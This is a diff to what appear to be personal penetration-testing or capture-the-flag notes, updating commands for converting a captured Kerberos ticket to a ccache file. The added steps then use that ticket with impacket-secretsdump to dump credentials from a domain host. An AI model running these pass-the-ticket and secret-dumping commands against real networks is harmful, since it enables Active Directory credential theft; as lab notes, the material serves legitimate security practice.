@@ -110,12 +110,16 @@ then copy ticket.kirbi to LOCAL machine and :
 ```shell
 base64 -di ticket.kirbi >> ticket.bin
 impacket-ticketConverter ticket.bin ticket.ccache
-cp ticket.ccache /tmp/krb5cc_0
-export KRB5CCNAME=/home/kali/box-$TARGET_NAME/files/ticket.ccache
+export KRB5CCNAME=/home/kali/$TARGET_NAME-box/files/ticket.ccache
+```
+
+```sh
+pip install minikerberos --user
+minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
 ```
 
 ```
-impacket-
+impacket-secretsdump -k -no-pass g0.$DOMAIN
 ```
 
 Check with:
